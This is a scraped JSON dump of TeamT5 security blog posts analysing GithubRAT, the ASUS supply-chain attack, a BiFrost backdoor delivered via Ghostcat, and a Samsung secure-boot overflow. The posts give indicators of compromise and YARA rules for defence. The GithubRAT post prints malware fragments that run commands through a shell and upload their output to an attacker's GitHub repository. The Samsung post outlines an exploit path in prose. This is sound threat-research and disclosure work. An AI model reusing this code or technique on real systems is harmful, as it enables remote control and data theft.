6. 不斷重複步驟 3 至步驟 5。\n\n<br>\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike Payload|\n|e5ed0de0100f670324202bbf5982a80a|Cobalt Strike  Payload|\n|4f67e80118dcc4a42ebcb2af2cad65ce|Hacktool，CVE-2014-4113 Exploit|\n|0468a816c167ca5ad301dc408eb19fb5|HackTool，Chrome Password Dump|\n|b33c7c022e1a25a981faabfc0fe53f6d|HackTool，AD Password Brute-Force Tool|\n|5178eb048ecaed83b69aa277a7c6d784|HackTool，NETBIOS NameServer Scanner|\n|2f9b582378c559ca66b48abd51f436a0|HackTool，TCP Port Banner Scanner|\n|aad8b062891c0715a1842270c0a871eb|HackTool，MS-17-010 Eternalblue Scanner|\n|41e32076f2e75181ce9f1cac6099a918|HackTool，MS-17-010 Eternalblue Scanner|\n|1a41f9550964ada62f87f6a0b79e37ba|HackTool，NETBIOS NameServer Scanner|\n_表一、駭客 GitHub 專案中的惡意程式列表_\n\n## 影響與建議\n由於許多單位都會使用 Github 服務作為版本控制之用，因此對 Github 的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date = \"2020-08-05\"\n    \n    strings:\n        $str1 = \"pyi-windows-manifest-filename\"\n        $str2 = \"https://api.github.com/repos/{}/{}/contents/{}/{}\"\n        $str3 = \"back_cmd\"\n        $str4 = \"put_git_answer\"       \n    \n        all of them\n}\n```\n\n![202008-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-3_222c942e82.png)\n_圖三、ThreatSonar 供資安人員快速匯入 Yara Rule 並自訂威脅等級_","title":"Github 不再只是版控平台，還是 APT 後門中繼站","createdAt":"2020-08-09T15:59:08.518Z","updatedAt":"2020-12-14T08:22:51.190Z","__v":0,"id":"5f301d4c163518003f86da79"}],"createdAt":"2020-08-09T15:59:08.292Z","updatedAt":"2021-01-27T04:40:39.819Z","__v":1,"author":"5eeae43e163518003f86d914","topic":{"category":"blogs","_id":"5ecaa004a792d70040a0d8b0","color":"#64cda2","name":"Technical Analysis","createdAt":"2020-05-24T16:25:40.461Z","updatedAt":"2020-06-07T22:08:04.525Z","__v":0,"contents":[{"locale":"en","_id":"5edd6544bf58af004a15410d","text":"Technical Analysis","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410d"},{"locale":"tw","_id":"5edd6544bf58af004a15410e","text":"技術分析","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410e"},{"locale":"jp","_id":"5edd6544bf58af004a15410f","text":"技術分析","createdAt":"2020-06-07T22:08:04.248Z","updatedAt":"2020-06-07T22:08:04.248Z","__v":0,"id":"5edd6544bf58af004a15410f"}],"posts":[{"publish":false,"enable_form":false,"tags":["5ecf88f2fedd7f004b26978b","5ecf8956fedd7f004b269791","5ecf8973fedd7f004b269792","5ecf88fdfedd7f004b26978c"],"relative_posts":[],"_id":"5ecab33b602fc9004047603e","post_url":"asus-supply-chain-attack-a-technical-look-inside","post_name":"ASUS Supply-Chain Attack: A Technical Look Inside","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342261/startup-593324_1920_2fcd2ea5f0.jpg","contents":[{"locale":"en","_id":"5ecab33b602fc9004047603f","title":"ASUS Supply-Chain Attack: A Technical Look Inside","context":"photo courtesy of: pixabay.com\n\nAsus, one of the world's largest computer makers, was believed to be the newest victim of a supply chain attack. According to the up-to-date blog of Kaspersky [1], ASUS Live Software Server was compromised by attackers to install malicious backdoors on customers' devices.\n\nIt was alleged that the malware was delivered to millions of Asus computers, although the attackers targeted only 600 specific MAC addresses. This phenomenon has been observed in several supply chain attacks associated with China-backed APT actors, such as CCleaner and NetSarang supply chain attacks in 2017.\n\nTeamT5 found several samples of this serial attack and performed technical analysis on it. The C2 is https://asushotfix[.]com, which was shut down during our analysis. Thus, we are not able to provide further information at this time.\n\n![Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_01_85f232f25d.png \"Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version\")\n_Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version_\n\nThe result indicates this attack was possibly carried out by Chinese hackers since they used PlugX Crypt for the shellcode derived from the file. Besides, TeamT5 observed several similar techniques between this attack and the previous cases, such as inserting malicious shellcode in the run-time initialization routine in C program. TeamT5 strongly believes that this supply chain attack on ASUS system was backed by China government and can be linked to the CCleaner and NetSarang attacks.\n\nFrom the C2 domain activation history, TeamT5 believes the initial campaign started from May 2018 and ended in around Oct 2018. However, the computers in the target list will be implanted with other malwares and keep being controlled by the threat actors. The only knowledge regarding the targets is a list of MAC address hashes and they could not be mapped to organizations or individuals. We urge our clients to check the IDS/IPS or try to use TeamT5's ThreatSonar to scan for further detection and defence.\n\n### Reference\n\n[1] https://securelist.com/operation-shadowhammer/89992/\n\n#### **Appendix**\n\nIndicator of Compromise (IoC)\n\n**C2 Domains and IPs:**\n\n* asushotfix[.]com\n* simplexoj[.]com\n* homeabcd[.]com\n* 35.154.92[.]115\n* 141.105.71[.]116\n\n**Malicious download links:**\n\n* hxxp://liveupdate01.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER365.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER362.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER360.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER359.zip\n\nHashes (MD5) :\n\n* 5855362028a58d8760c9ea2dcdf37af5\n* 0db57cc899ae7385c60b16a62b748a18\n* c0116d877d048b1ba87c0de6fd7c3fb2\n* 7df9736f60a979eee5b90d6c53dc9374\n* 56a046f11c84c691295267dcf1f00c4a\n* fa83ffde24f149f9f6d1d8bc05c0e023\n* 17a36ac3e31f3a18936552aff2c80249\n* 2a95475af7a07ee95ab11caad9e99b0c\n* 0f49621b06f2cdaac8850c6e9581a594\n* f2f879989d967e03b9ea0938399464ab\n* 06c19cd73471f0db027ab9eb85edc607\n* 63f2fe96de336b6097806b22b5ab941a\n* 9c74402572344aee9018587188fe441e\n* bd809a2abb1eda0e28becc1661b96581\n* 8baa46d0e0faa2c6a3f20aeda2556b18\n* cdb0a09067877f30189811c7aea3f253\n* aa15eb28292321b586c27d8401703494\n* 8756bafa7f0a9764311d52bc792009f9\n* 2ec9d0df80df005becbd37142811e43b\n* 55a7aa5f0e52ba4d78c145811c830107\n* 915086d90596eb5903bcd5b02fd97e3e\n* 5220c683de5b01a70487dac2440e0ecb\n* 5855ce7c4a3167f0e006310eb1c76313\n\n**Thumbprint of abused certificate:**\n\n* 626646d29c5b0e7c53aa84698a4a97be323cf17f\n\nYara rule:\n\n```yara\nrule apt_trojan_AsusSetup_encoder\n{\n  strings:\n    $plugx_crypt = { 55 8BEC 81EC 08010000 53 56 57 8DBD F8FEFFFF B9 42000000 B8 CCCCCCCC F3 AB C745 F8 00000000 C745 EC 00000000 8B45 08 8B08 894D E0 8B45 08 8B08 894D D4 8B45 08 8B08 894D C8 8B45 08 8B08 894D BC 8B45 E0 C1E8 03 8B4D E0 8D9401 EFEEEEEE 8955 E0 8B45 D4 C1E8 05 8B4D D4 8D9401 DEDDDDDD 8955 D4 8B45 C8 C1E0 07 B9 33333333 2BC8 034D C8 894D C8 8B45 BC C1E0 09 B9 44444444 2BC8 034D BC 894D EC 8B45 EC 8945 BC 8B45 08 0345 F8 0FB608 8B55 E0 81E2 FF000000 0FB6C2 8B55 D4 81E2 FF000000 0FB6D2 03C2 8B55 C8 81E2 FF000000 0FB6D2 03C2 8B55 EC 81E2 FF000000 0FB6D2 03C2 33C8 8B45 10 0345 F8 8808 8B45 F8 83C0 01 8945 F8 8B45 F8 3B45 0C 0F8C 50FFFFFF 5F 5E 5B 8BE5 5D C2 0C00 }\n\n  condition:\n    all of them\n}\n\nrule apt_trojan_AsusSetup_memory\n{\n  strings:\n    $plugx_crypt = { 55 8BEC 81EC 08010000 53 56 57 8DBD F8FEFFFF B9 42000000 B8 CCCCCCCC F3 AB C745 F8 00000000 C745 EC 00000000 8B45 08 8B08 894D E0 8B45 08 8B08 894D D4 8B45 08 8B08 894D C8 8B45 08 8B08 894D BC 8B45 E0 C1E8 03 8B4D E0 8D9401 EFEEEEEE 8955 E0 8B45 D4 C1E8 05 8B4D D4 8D9401 DEDDDDDD 8955 D4 8B45 C8 C1E0 07 B9 33333333 2BC8 034D C8 894D C8 8B45 BC C1E0 09 B9 44444444 2BC8 034D BC 894D EC 8B45 EC 8945 BC 8B45 08 0345 F8 0FB608 8B55 E0 81E2 FF000000 0FB6C2 8B55 D4 81E2 FF000000 0FB6D2 03C2 8B55 C8 81E2 FF000000 0FB6D2 03C2 8B55 EC 81E2 FF000000 0FB6D2 03C2 33C8 8B45 10 0345 F8 8808 8B45 F8 83C0 01 8945 F8 8B45 F8 3B45 0C 0F8C 50FFFFFF 5F 5E 5B 8BE5 5D C2 0C00 }\n\n  condition:\n    all of them\n}\n```\n\n#### How to use IOC in ThreatSonar\n\nA. You can import IOCs into ThreatSonar and launch \"Retro Hunt\" to see if there is any matches.\n\n![Import IOC into ThreatSonar Intel.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_02_4ceec82521.png \"Import IOC into ThreatSonar Intel.\")\n_Import IOC into ThreatSonar Intel._\n\nB. The malware is using valid \"ASUSTek\" certificate, the thumbprint of the certificate can be searched in \"Hunter\" page.\n\n![Details of abused certificate.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_03_0dce4b9764.png \"Details of abused certificate.\")\n_Details of abused certificate._\n\nIn \"Hunter\" page, you are able to search \"thumbprint = 626646d29c5b0e7c53aa84698a4a97be323cf17f\" by switching scope to \"Certificate\" (Please select \"Engine Version\" to All).\n\nP.S. If you find any matched results, don’t hesitate to contact with us.\n\n![Thumbprint matched endpoints and programs.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_04_380dc77e41.png \"Thumbprint matched endpoints and programs.\")\n_Thumbprint matched endpoints and programs._\n![The related thumbprint was found.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342398/02_05_6dfb694a3a.png \"The related thumbprint was found.\")\n_The related thumbprint was found._\n\nC. To use the yara rule, just create yara ruleset, then copy and paste the yara rule listed above.\n\n![Import the yara rule.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342321/02_06_a1dfcf5ab0.png \"Import the yara rule.\")\n_Import the yara rule._\n","createdAt":"2020-05-24T17:47:39.800Z","updatedAt":"2020-07-02T08:45:53.754Z","__v":0,"id":"5ecab33b602fc9004047603f"}],"createdAt":"2020-05-24T17:47:39.794Z","updatedAt":"2020-07-02T08:45:53.779Z","__v":1,"topic":"5ecaa004a792d70040a0d8b0","author":null,"publish_date":"2019-03-28T04:00:00.000Z","id":"5ecab33b602fc9004047603e"},{"publish":true,"enable_form":false,"tags":["5ecf6d0afedd7f004b26974d","5ecf6d12fedd7f004b26974e","5ecf6d1bfedd7f004b26974f","5ecf6d24fedd7f004b269750","5ecf6d2cfedd7f004b269751","5ecf6d34fedd7f004b269752","5ecf6d3bfedd7f004b269753"],"relative_posts":["5ff3bdcac56e80003f98594f"],"_id":"5ecab4f8602fc9004047604f","post_url":"technical-analysis-on-backdoor-bifrost-of-the-Chinese-apt-group-huapi","post_name":"中國駭客 HUAPI 的惡意後門程式 BiFrost 分析","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342884/123123_ca53df5021.jpg","contents":[{"locale":"tw","_id":"5ecab4f8602fc90040476050","title":"中國駭客 HUAPI 的惡意後門程式 BiFrost 分析","context":"**關鍵字：HUAPI、PLEAD、GhostCat、CVE-2020-1938、Linux、BiFrost、RC4、RAT**\n\n### 前言\n\nTeamT5 近期接獲情資，於台灣某學術網路的圖書館網站上發現存有惡意程式。經過 TeamT5 研究員分析調查發現，該網站系統使用 Tomcat 7.0.73 作為網頁伺服器且開啟 8009 通訊埠，TeamT5 研究員驗證網站具有 Ghostcat（CVE-2020-1938） 漏洞，詳見下圖。\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590715647/Huapi_1_693c241b07.png)\n_圖一、Nmap 掃描結果_\n\n駭客利用 Tomcat 網頁伺服器預設開啟的 AJP 服務（預設為 8009 通訊埠），可達到遠端指令執行（Remote Code Execution, RCE）之目的並上傳檔案。於該案例中，駭客疑似透過 Ghostcat 漏洞上傳 BiFrost 惡意程式，使該圖書館系統成為惡意程式下載站（Download Site）。\n\n### 惡意程式分析\n\n該惡意程式（8fd3925dadf37bebcc8844214f2bcd18）於 2020 年 1 月 31 日被上傳至 Virustotal 平台，當時的各家防毒軟體的偵測率並不佳，僅有 6 家防毒軟體能夠有效識別，詳見下圖。\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590715649/Huapi_2_f22974775a.png)\n_圖二、惡意程式於一月底上傳至 VirusTotal 且一開始防毒軟體的偵測率並不佳_\n\nTeamT5 取得該惡意後門程式並進行分析，該惡意後門程式檔名為 md.png，但檔案格式為 UNIX ELF 執行檔，推測是利用 PNG 副檔名偽裝在 Tomcat 網站伺服器上，詳見下圖。\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590715648/Huapi_3_c26aa8fc03.png)\n_圖三、偽裝為 PNG 的 ELF 執行檔_\n\n使用 TeamT5 的 ThreatSonar 惡意威脅鑑識系統可有效辨識出該惡意程式並可以偵測到中繼站 IP 位址（107.191.61.247），詳見下圖。\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590715648/Huapi_4_60a6816101.png)\n_圖四、ThreatSonar 偵測畫面_\n\n經過逆向分析，該惡意後門程式具有上傳/下載/列舉/刪除/搬移檔案（File）、執行/結束程序（Process）、開啟/關閉遠端命令列介面程式（Remote Shell）等功能，其中惡意後門程式與中繼站的連線內容會使用修改過的 RC4 演算法進行加密，此專屬特徵可用來辯認出此惡意程式，詳見下圖。\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590715648/Huapi_5_9291a10e8d.png)\n_圖五、惡意後門程式使用修改後的 RC4 加密演算法_\n\n### 攻擊族群分析\n\n該惡意程式為 Linux 版本的 BiFrost 後門程式，其版本號為 5.0.0.0。根據 TeamT5 長期研究的情資顯示，該惡意程式為中國駭客組織 HUAPI（又名為 PLEAD）慣用的後門程式。HUAPI 駭客組織自 2007 年開始活躍至今，攻擊台灣超過 10 年的時間。TeamT5 觀察到 HUAPI 所開發的惡意程式有時會使用加殼來阻擋研究人員分析，且通常會使用修改後的 RC4 演算法來加密傳輸。HUAPI 長期攻擊政府、高科技、電信或研究智庫單位，根據 TeamT5 的統計結果，超過 5 成的受害單位為政府機關，受害國家包含台灣、美國、日本及南韓，其中針對台灣政府機關進行入侵攻擊的為多。\n\n### 影響與建議\n\n若用戶有使用 Tomcat 服務作為網頁伺服器，且版本為以下之一者：\n\n* Apache Tomcat 9.x < 9.0.31\n* Apache Tomcat 8.x < 8.5.51\n* Apache Tomcat 7.x < 7.0.100\n* Apache Tomcat 6.x\n\nTeamT5 建議需要立即進行版本更新，避免遭到駭客利用 Ghostcat 漏洞進行遠端控制，甚至上傳惡意檔案。\n\n另外，若用戶若遭遇針對性進階持續威脅（Advanced Persistent Threat, APT）時，則需要使用如 TeamT5 的 ThreatSonar 惡意威脅鑑識系統，IT 管理者可以在最短時間內偵測並回應這類的惡意威脅。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入到各式資安設備中偵測與識別威脅。\n\n* 107.191.61.247\n* 8fd3925dadf37bebcc8844214f2bcd18\n* Yara Rule\n\n      rule RAT_BiFrost_UNIX\n      {\n          meta:\n          description= \"HUAPI UNIX BiFrost RAT\"\n          author = \"TeamT5\"\n          date = \"2020-04-15\"\n          \n          strings:\n          $hex1 = {25 ?? 00 00 00 85 C0 75 37 8B 45 F0 89 C1 03 4D 08 8B 45 F0 03 45 08 0F B6 10 8B 45 F8 01 C2 B8 FF FF FF FF 21 D0 88 01 8B 45 F0 89 C2 03 55 08 8B 45 F0 03 45 08 0F B6 00 32 45 FD 88 02}\n          $hex2 = {8B 45 F0 03 45 08 0F B6 00 30 45 FD 8B 45 F0 89 C1 03 4D 08 8B 45 F8 89 C2 02 55 FD B8 FF FF FF FF 21 D0 88 01}\n          \n          condition:\n          all of them\n      }\n\n### 外部參考資料\n\n1. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938","createdAt":"2020-05-24T17:55:04.693Z","updatedAt":"2020-12-14T02:00:52.669Z","__v":0,"id":"5ecab4f8602fc90040476050"}],"createdAt":"2020-05-24T17:55:04.688Z","updatedAt":"2021-01-05T02:10:55.681Z","__v":1,"topic":"5ecaa004a792d70040a0d8b0","author":"5eeae43e163518003f86d914","publish_date":"2020-04-15T02:00:00.000Z","id":"5ecab4f8602fc9004047604f"},{"publish":true,"enable_form":false,"tags":["5ed467d0165e5f006fa403fd","5ed467b5165e5f006fa403fc"],"relative_posts":["5ffd4148c56e80003f98595c"],"_id":"5ee07e4bbf58af004a154155","post_url":"blackhat-s-talk-breaking-samsung-s-root-of-trust-exploiting-samsung-secure-boot","post_name":"BlackHat's Talk: Breaking Samsung's Root of Trust - Exploiting Samsung Secure Boot","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590731286/20200608_cover_23a0b23713.jpg","contents":[{"locale":"en","_id":"5ee07e4bbf58af004a154156","title":"BlackHat's Talk: Breaking Samsung's Root of Trust - Exploiting Samsung Secure Boot","context":"### D39\n\nD39 focuses on vulnerability research and has identified several critical security flaws, including technical exploitation of mobile, IoT devices, and Linux and Windows operating systems. We have reported dozens of vulnerabilities and dedicate to Samsung Vulnerabilities and Exposures (SVE) and Common Vulnerabilities and Exposures (CVE).\n\nBefore diving into the main subject this month, we are glad to announce that TeamT5 is again accepted at Black Hat USA, and our vulnerability research team, D39, will talk at the Black Hat Briefings in the upcoming August. We are honored to share our research findings with researchers and security experts all over the world and expect more recognition of Taiwan's vulnerability researchers in the world.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1591769445/D39_6-1_6807f98c9b.png)\n[Black Hat Session](https://www.blackhat.com/us-20/briefings/schedule/index.html#breaking-samsungs-root-of-trust-exploiting-samsung-s-secure-boot-20290)\n\nThis article will cover a part of our talk at Black Hat USA in August.\n\n### Introduction\n\nWe have found several vulnerabilities in Samsung Secure boot, which can break through Samsung Knox protections. We can even retrieve users' sensitive data from a locked device. The affected Samsung mobiles include Galaxy S8, S9, and S10. Patches to these vulnerabilities have been provided by Samsung.\n\nOne of these vulnerabilities allows attackers to execute arbitrary code in Galaxy S8 secure bootloader to access the device. In this article, we will elaborate how we exploit these vulnerabilities to bypass S8 secure bootloader through the USB device and obtain arbitrary code execution in early boot stage.\n\nNote: Another security research team found this vulnerability at the same time and report it to Samsung.\nID: SVE-2019-15230 (details below).\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1591769435/SVE-2019_3bc5eea84d.png)\n\n### KNOX\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1591769436/D39_6-2_ee457f68cd.png)\n[Image courtesy](https://docs.samsungknox.com/whitepapers/knox-platform/hardware-backed-root-of-trust.htm)\n\nAs the market leader of smartphone, Samsung conducts a series of protection on Android, known as the Knox Platform, to ensure the security of its devices. During the booting process, Samsung uses S-boot (Secure Boot) to make sure it can only boot a stocked image. If the device tries to boot a custom image, it will trip (turned from 0X0 to 0X1) a one-time programmable bit e-fuse (a.k.a Knox bit). Once a trustzone app (trustlet) detects the Knox bit tripped, it will delete the encryption key of sensitive data to prevent unauthorized data from accessing the locked device.\n\n### Vulnerability\n\nSmartphones with Samsung Exynos processor use a exclusive secure bootloader named S-boot. S-boot has ODIN mode which allows users to upgrade the firmware manually. Due to the insufficiency in its code, the flash command (opcode: 0x66) in ODIN mode is not able to properly check the flash image size, which leads to buffer overflow.\n\nThe flash command in ODIN mode uses a temporary buffer to store the image. In Galaxy S8, the buffer is located at 0xC0000000, right in front of sboot code segment (0xC9000000). Although the system will check to ensure that the size being no larger than 0x1e0000, it uses signed comparison to check the size of the image; thus provide us some space to get around. We therefore provide a size larger than 0x80000000, making buffer overflowed and, in the end, the following segments such as code, stack, and heap will be overwritten.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1591769435/D39_6-3_8b038e080e.png)\n\n### The Exploit\n\n#### Code Execution\n\nAlthough we can overflow the code segment of S-Boot, we still cannot hijack the execution flow. Since USB receivers use physical memory to hold the data it received directly, we cannot affect instruction cache unless the cache line has been invalidated.\n\nFortunately, the heap segment is not cached due to MMU flag. There are some pointers stored in the heap segment, which can be accessed during the USB process. If we overwrite these pointers with null bytes, the processor will trigger an exception and trap into the exception handler while accessing to NULL pointers. Since the handler has never been executed, it is not cached in the instruction cache. Therefore we can also overwrite the exception handler simultaneously and hijack it directly to our shellcode.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1591769437/D39_6-4_58c7cc6a95.png)\n\n#### Booting Custom Kernel\n\nSince all the run-time data has been overwritten -- including stack, heap and global variables -- the sboot fail to perform further booting operation. These kinds of data are difficult to recover, so we must re-execute the booting process.\n\nUnder normal condition, S-boot calls several functions in a particular function table which is located at 0xC90C7350. To re-execute s-boot, these functions have to be invoked sequentially again. They would initialize the memory of heap and stack, set the global variables, and boot the kernel at the end. However, these functions also involve some SMC calls which cannot be executed twice. Since we only compromised EL1 (Exception Level 1), the trustzone in EL3 (Exception Level 3) cannot be reverted. As a result, we have to overwrite these SMC calls with NOP instruction while overflowing the code segment to ignore those SMC (System Management Controller) calls.\n\nAfter all the run-time data has been reset, we replace the original kernel with our custom one. Then we execute one last function to boot our custom kernel and get the **root privilege without blowing KNOX bit**.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1591769436/D39_6-5_2f6b6f9ccd.png)\n\n### Timeline\n\n2019-10-02 Report Vulnerability\n2019-10-08 Informed Vulnerability duplicated and release patch note\n\n### Appendix: Potential Exploit Path on Galaxy S10\n\nAccording to our analysis, this vulnerability affects Galaxy S9, Galaxy S10 and Galaxy Note 10 as well. Among them we find that exploitation can still be trigger at different address. For instance, even the temporary buffer located at different addresss, like 0x890000000 in Galaxy S10, there are still chances to exploit it. To explain the complete exploitation flow, we choose the firmware, G970FXXU1ASD5, as an example.\n\nIn Galaxy S9 and later version, there is another feature added to the secure boot - compressed_download. It uses another buffer to store the flash image. However if compressed_download failed during the initialization, it will fallback to normal download, and use the buffer (0xC0000000) to store the flash image.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1591769435/D39_6-6_724f86aa51.png)\n\nTo make S-boot fallback to normal download, we have to make the function `cd_v3_smp_register` fail. After reversing, we noticed that the function `cd_v3_smp_register` may return failed if there is no available core(`booted_cores` > 3) can be booted. Coincidentally, there is a test command - \"smp_boot_test\" in the UART (Universal Asynchronous Receiver/Transmitter) console. The command smp_boot_test will boot a core and add the count of the booted_cores. Although `smp_boot_test` shutdown the booted up core immediately, it didn't restore the count. Therefore, the compressed_download_init may failed if the command `smp_boot_test` has been invoked more than twice before entering the download mode.\n\nIf we have the UART debug cable to get the UART console, we can call the command`smp_boot_test` 3 times and enter the download mode via the command `usb`. The `compressed_download_init` would fail, then the temporary buffer fallback to 0xC0000000. Therefore the arbitrary code execution on S10's bootloader can be achieved as the one in Galaxy S8.\n\nWe managed to build our own TypeC debug cable at first. However, after trying every kinds of Pull-up/down resistor value, TypeC accessory mode, TypeC VDM, we cannot yet figure out a cable for RID_523K detection. Still, in the end, we applied other approach that enable us to attain **Galaxy S10 Secure Bootloader's permission of arbitrary code** without having debug cable.\n\nWe will have a thorough display on Black Hat. Stay tuned!\n\nFor the latest vulnerability research from D39, please follow:\n\nTeamT5 official website: [https://teamt5.org/](https://teamt5.org/ \"https://teamt5.org/\")\n\nTwitter: [https://twitter.com/TeamT5_Official](https://twitter.com/TeamT5_Official \"https://twitter.com/TeamT5_Official\")","createdAt":"2020-06-10T06:31:39.066Z","updatedAt":"2020-07-02T09:16:52.294Z","__v":0,"id":"5ee07e4bbf58af004a154156"}],"createdAt":"2020-06-10T06:31:39.059Z","updatedAt":"2021-01-13T02:33:44.215Z","__v":1,"topic":"5ecaa004a792d70040a0d8b0","publish_date":"2020-06-10T03:00:00.000Z","author":"5eeadf2c163518003f86d911","id":"5ee07e4bbf58af004a154155"},{"publish":true,"enable_form":false,"tags":["5f30c347163518003f86daa6","5f30c34c163518003f86daa7","5ecf8956fedd7f004b269791","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd1cef79f8bdc004a7fdf4a"],"_id":"5f301d4c163518003f86da78","post_url":"Introducing-githubrat-malware-using-github-as-c2-server","post_name":"Github 不再只是版控平台，還是 APT 後門中繼站","publish_date":"2020-08-13T02:30:00.000Z","contents":[{"locale":"tw","_id":"5f301d4c163518003f86da79","context":"圖片來源：[Unsplash](https://unsplash.com/photos/Bb_X4JgSqIM)\n\n## 前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n<br>\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t > 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 6. 不斷重複步驟 3 至步驟 5。\n\n<br>\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password 